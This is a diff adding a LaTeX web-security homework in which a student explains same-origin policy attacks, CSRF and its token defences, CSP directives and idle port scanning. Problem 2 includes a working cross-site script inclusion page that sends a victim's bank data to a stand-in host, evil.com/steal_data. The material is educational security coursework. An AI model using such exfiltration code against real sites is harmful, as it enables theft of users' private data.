@@ -1,0 +1,189 @@
+\documentclass[12pt]{article}
+\usepackage{fullpage,enumitem,amsmath,amssymb,graphicx}
+\usepackage{listings}
+\usepackage{tikz}
+\usepackage{hyperref}
+\usepackage{bbm}
+\usepackage{color}
+\definecolor{editorGray}{rgb}{0.95, 0.95, 0.95}
+\definecolor{editorOcher}{rgb}{1, 0.5, 0} % #FF7F00 -> rgb(239, 169, 0)
+\definecolor{editorGreen}{rgb}{0, 0.5, 0} % #007C00 -> rgb(0, 124, 0)
+\usepackage{upquote}
+\usepackage{listings}
+\lstdefinelanguage{JavaScript}{
+  morekeywords={typeof, new, true, false, catch, function, return, null, catch, switch, var, if, in, while, do, else, case, break},
+  morecomment=[s]{/*}{*/},
+  morecomment=[l]//,
+  morestring=[b]",
+  morestring=[b]'
+}
+
+\lstdefinelanguage{HTML5}{
+        language=html,
+        sensitive=true, 
+        alsoletter={<>=-},
+        otherkeywords={
+        % HTML tags
+        <html>, <head>, <title>, </title>, <meta, />, </head>, <body>,
+        <canvas, \/canvas>, <script>, </script>, </body>, </html>, <!, html>, <style>, </style>, ><
+        },  
+        ndkeywords={
+        % General
+        =,
+        % HTML attributes
+        charset=, id=, width=, height=,
+        % CSS properties
+        border:, transform:, -moz-transform:, transition-duration:, transition-property:, transition-timing-function:
+        },  
+        morecomment=[s]{<!--}{-->},
+        tag=[s]
+}
+
+\lstset{%
+    % Basic design
+    backgroundcolor=\color{editorGray},
+    basicstyle={\small\ttfamily},   
+    frame=l,
+    % Line numbers
+    xleftmargin={0.75cm},
+    numbers=left,
+    stepnumber=1,
+    firstnumber=1,
+    numberfirstline=true,
+    % Code design   
+    keywordstyle=\color{blue}\bfseries,
+    commentstyle=\color{darkgray}\ttfamily,
+    ndkeywordstyle=\color{editorGreen}\bfseries,
+    stringstyle=\color{editorOcher},
+    % Code
+    language=HTML5,
+    alsolanguage=JavaScript,
+    alsodigit={.:;},
+    tabsize=2,
+    showtabs=false,
+    showspaces=false,
+    showstringspaces=false,
+    extendedchars=true,
+    breaklines=true,        
+    % Support for German umlauts
+    literate=%
+    {Ö}{{\"O}}1
+    {Ä}{{\"A}}1
+    {Ü}{{\"U}}1
+    {ß}{{\ss}}1
+    {ü}{{\"u}}1
+    {ä}{{\"a}}1
+    {ö}{{\"o}}1
+}
+
+\newcommand{\vect}[1]{\boldsymbol{#1}}
+
+\begin{document}
+
+\begin{center}
+{\Large CS 155 Spring 2018 Homework 2}
+
+\begin{tabular}{rl}
+SUNet ID: & 05794739 \\
+Name: & Luis Perez \\
+Late Days: & 2
+\end{tabular}
+\end{center}
+
+By turning in this assignment, I agree by the Stanford honor code and declare
+that all of this is my own work.
+
+\section*{Problem 1}
+Suppose we defined the DOM same-origin policy using only the (domain, port) pairing (ignoring the protocol). This would be very bad, as a network attacker could easily snoop on anyone visiting what are supposed to be encrypted sites. For a specific attack, consider a user that wishes to login to their bank account by going to https://www.mysecurebank.com:443/login. With our modified same-origin policy, the origin is (www.mysecurebank.com, 443). Knowing this (which is public information), an attacker could set-up a website located at \\http://www.mysecurebank.com:443, which by our modified same-origin policy, actually has the same origin. The first step would then be to trick the user into visiting the attacker's site. The site's only purpose would be to open a new tab/window, and redirect the user to https://www.mysecurebank.com:443/login. This is relatively common practice, so a user might not be suspicious of the still-open window containing http://ww.mysecurebank.com:443. At this point, the user would now be at the legitimate login site for his bank, and would be able to login and perform transactions. The problem would be that the still open window pointing to http://www.mysecurebank.com:443, by our modified same-origin DOM policy, would be able to directly access the DOM for the bank's website. It could then add listeners to the input fields (to capture usernames and passwords), thereby gaining access to the user's bank account.
+
+\pagebreak
+\section*{Problem 2}
+\begin{enumerate}[label=(\alph*)]
+	\item This is a straight-forward case of Cross Site Script Inclusion. Since the ``userdata.js'' script is generated dynamically, https://evil.com can simply have the following code on its page:
+	\begin{lstlisting}
+		<!DOCTYPE html>
+		<html>
+		<body>
+			<p>Thanks for visiting!</p>
+			<script>
+			function displayData(data) {
+				const req = new XMLHttpRequest();
+				req.withCredentials=true;
+				req.open('POST', 'https://evil.com/steal_data');
+				req.setRequestHeader('Content-Type', 'application/json');
+				req.send(JSON.stringify(data));
+			}
+			</script>
+			<script src="//bank.com/userdata.js"> </script>
+		</body>
+		</html>
+	\end{lstlisting}
+	Note that when the ``userdata.js'' script is loaded, the browser will automatically send the authentication cookies for https://bank.com along with the request to fetch the script. From the point of view of the bank.com server, this is a completely legitimate request, and thus it will generate and return the script with John Doe's data. However, now the script will execute in the context of the evil.com page, which has defined a different implementation of displayData, which in this case, does not display it, but instead sends it to a handler in evil.com and steals it.
+
+	\item We can modify the code to load the dynamically generated data in an iframe. We can change the code to be:
+	\begin{lstlisting}
+	<iframe src="//bank.com/userdata.html"> </iframe>
+	\end{lstlisting}
+	We now change ``userdata.js'' into an html file (``userdata.html'') which will, again, simply contain, in <script> tags, the javascript  calling the displayData function.
+
+	However, note that by default, iframes are restricted by the same-origin policy (SOP). When we load the iframe into https://bank.com, the code can access the DOM of the main page, and therefore can call the defined displayData function to display the secret data. However. due to SOP, if an attacker tries to load the iframe into their site (ie, https://evil.com), the iframe will not be able to access the DOM of the main page (and vice-versa), since they have different origins. Therefore, no matter what the attacker does to his own page, he will not be able to access the secret data loaded in the iframe in any way.
+\end{enumerate}
+
+\pagebreak
+\section*{Problem 3}
+\begin{enumerate}[label=(\alph*)]
+\item A possible attack would be to set-up https://evil.com which includes a canvas element on the page. Now, suppose a user has authenticated to a site that displays private information, such as https://googlephotos.com. The private information in this case, is in the form of the private photos of the user. Now, if Javascript from one domain can embed an image from another domain in the canvas, we set-up https://evil.com to do just that -- embed the images from https://googlephotos.com. Since the user is assumed to already be logged in, the authentication cookies are transparently passed by the browser to the server hosting https:://googlephotos.com, thereby retrieving the private information of the user. https://evil.com can then use GetImageData() to read the pixesl, encode them, and send them to a recipient, malicious end-point.
+\item We can restrict GetImageData() by making sure that it does not execute when reading images that are not from the same origin as the canvas. This will still allow us to load images from any origin (similar to iframes), but GetImageData would not return any data not from the canvas domain, thereby blocking the attack from (a) since when https://evil.com calls GetImageData, it will return an error indicating that the only data is actually not from https://evil.com.
+\item  If calling GetImageData() always returned the actual pixels shown on the screen at that position, it would open up the ability to violate SOP and other restrictions enforcing the principle of least privalage. For example, an attacker could set-up https://evil.com which does two main things: (1) embed https://bank.com in an iframe inside https:://evil.com, and (2) draws a transparent canvas over the entire webpage.
+
+With the above, https://evil.com can now directly snoop on iframe, thereby extracting information it should not be able to and violating SOP, since it is able to see the DOM elements in https://bank.com without being from the same origin.
+\item We could design GetImageData() such that it returns the value of pixels that have been added to the Canvas object, and note just the value of the pixels on the screen for the Canvas object. In other words, GetImageData() will not return the value of the on-screen pixel, but rather the value of the pixel as changed in the canvas.
+\end{enumerate}
+
+\pagebreak
+\section*{Problem 4}
+\begin{enumerate}[label=(\alph*)]
+\item A Cross Site Request Forgery attack is relatively simple on a site that relies solely on cookies for session management (such as bitbar from Project 2). The jist of the attack relies on the fact that session is state is stored entirely in cookies. For example, a user logins in to https://victim.com/login. The website will authenticate the user, and set a cookie in the browser containing the live session (ie, the fact that the user is now authenticated). The user can now navigate to https://victim.com/do\_something\_secret to perform some secret action that requires authentication. However, suppose now a user visits https://evil.com instead. evil.com can take advantage of the fact that the user is already logged-in to victim.com and (secretly, unknown to the user) send a request to https://victim.com/do\_something\_secret. The browser will send along any cookies associated with the origin https://victim.com (ie, the session information), and therefore, from the point of view of the victim.com server, the request is a legitimate request from the user's account.
+
+The attack described above is a type of cross site request forgery.
+
+\item A common CSRF defense places a token in the DOM of every page (unique to each session). An HTTP request is accepted by the server only if it contains both a valid HTTP cookie header and a valid token in the POST parameters. This prevents the attack from part (a) because this token is impossible for an attacker to obtain or guess. We assume the attacker has no way of guessing the token (ie, the token generation method is robus). Therefore the attacker must obtain the token directly from the server. Can the attacker snoop on the token from the form and retrieve it? In this case, the SOP of browser will prevent any website with a different origin from accessing the DOM containing the unique, session token, and therefore the attacker from part (a) will not be able to obtain this token and send it along with his/her request. The server will therefore reject the request as not having originated from the correct domain, and do nothing.
+
+\item I chose to interpret the working "The server checks that this random string is present" to mean the the server checks that a token is present and that the token is precisely the one that was set with the previous response. The proposed mechanism is a commonly used mechanism to prevent CSRF attacks, and will do so successfully. This is because the token is unique per session, which means an attacker cannot obtain a copy of the secret token, since any connection it attempts with the server will either (1) require a token for the existing session, which the attacker does not have or (2) start a new session, which means the attacker will receive a new, completely random token unrelated to that of the victim's session.
+
+\item The proposed mechanism does not prevent CSRF attacks. The reason is that the random token is fixed for a certain period of time. Therefore, all the attacker has to do is (1) request the token from the victim server (this can be done under an already compromised user session or, alternatively, under the attacker's own, legitimate session) and then (2) use the obtained token in the attack from part (a). Depending on how recently the user interacted with the victim server and on how frequently the random token is chosen, there will be a particular window during which the attack will succeed. Therefore, this type of mechanism is not secure.
+
+\item As discussed in (c), the SOP policy is important because this prevents the attacker from obtaining the token provided by the server. If the SOP origin was not in place, an attacker would be able to directly read the token embeded in the HTML, and simply send this along with his/her malicious request.
+\end{enumerate}
+
+\pagebreak
+\section*{Problem 5}
+
+\begin{enumerate}[label=(\alph*)]
+\item The purpose of this directive is to inform the browser to only allow scripts with the same origin as the website to run. Any other script from any other origin will should not be executed. The prevents any attack that relies on injecting scripts into the victim site, since these scripts will likely be from a different origin (ie, unless the victim server is compromised too, they can't be hosted on the victim's server). By setting this directive, the owner of the site will mitigate any attacks which rely on code injection.
+
+\item The purpose of this directive is to restrict the origins which can embed the response. In this case, by setting the directive to 'none', a browser will refuse to embed the page into a <frame>, <iframe>, <object>, <embed>, or <applet> tag in another page. This will help prevent attacks which embed a legitimate site into an attacker's site to help with phishing. It can also prevent attacks where the site in embeded into an attackers page and interactions with the site are then tracked/captured, thereby private/secure information leaking to the attacker.
+
+\item The directive informs the browser to process the content from the response in a sandboxed environment (similar to <iframe sandbox>), thereby applying restrictions to the content's actions including preventing popups, preventing the execution of plugins and scripts, and enforcing a same-origin policy.
+
+Now, we suppose a page with this CSP header is loaded from domain www.xyz.com. The browser will assign a unique origin to this page (NOT www.xyz.com). This means that the content will not be able to read any cookies from www.xyz.com (since this would violate SOP). This header will therefore be very useful, for example, if a website wishes to load advertisements or other content from an untrusted third-party which is for display purposes only and which should not have access to any of the cookies of www.xyz.com.
+\end{enumerate}
+
+\pagebreak
+\section*{Problem 6}
+\begin{enumerate}[label=(\alph*)]
+\item If P implements a global identification field, we can test if P sent a packet to anyone (other than ourselves) within a certain one minute window by simply sending two ICPM ping requests. The first, at the start of the one-minute window. We record the value of the indentification field, label it $t_s$. After one minute, we send a second ICPM ping request. Label the identification field of the reponse as $t_f$. Let $p$ be the number of packets that A has received from P during the 1-minute window (including the two at the beginning and end, ie $p \geq 2$). If $P$ has not communited with anyone but $A$, we expect $t_f - t_s + 1 = p$. Then if $t_f - t_s +1 > p $, we know that $P$ has communicated with someone other than $A$ (all of the above module packets possibly being lost in-transit from P to A). 
+\item We can use $P$ to port scan $V$ by taking advantage of our ability to determine if $P$ has communicated with anyone other than $A$. The attacks works as follows. Suppose we wish to determine if port $n$ in $V$ is open or closed. We do the following:
+\begin{enumerate}
+	\item A sends an ICPM ping request to $P$ (starting the interval)
+	\item A sends a SYN packet to $V$ with a spoofed source address which corresponds to $P$.
+	\item A send an ICOM ping request to $P$ (ending the interval)
+	\item If, as described in part (a), we determine that $P$ only talked with $A$ during this interval, then we can be relatively certain that $V$ either (1) did not respond to the SYN packet (in the interval), which probably means $V$ is not live or (2) $V$ responded with an RST packet and therefore $P$ did not respond, implying port $n$ is closed.
+	\item If, on the other hand, we determine that $P$ talked to someone other than $A$ during this interval, it's very likely that the communication occured between $P$ and $V$. In other words, $V$ sent a SYN/ACK packet to $P$, who was not expecting it, and so sent an RST packet to $V$. This implies that port $n$ is open in $V$.
+\end{enumerate}
+Note that we can repeat the above process multiple times on the same port -- if we can reliable replicate the same outcome, than we can be relatively certain as to the status of port $n$ on $V$. If, instead, we know that $P$ will only communicate with either $A$ or $V$ (as implied by piazza post @545), then we don't need to repeat the process above multiple times -- a single run will determine relatively well whether port $n$ is open or closed (barring unforseen network issues, such as packet being delated > 1 minute).
+\end{enumerate}
+
+
+
+\end{document}
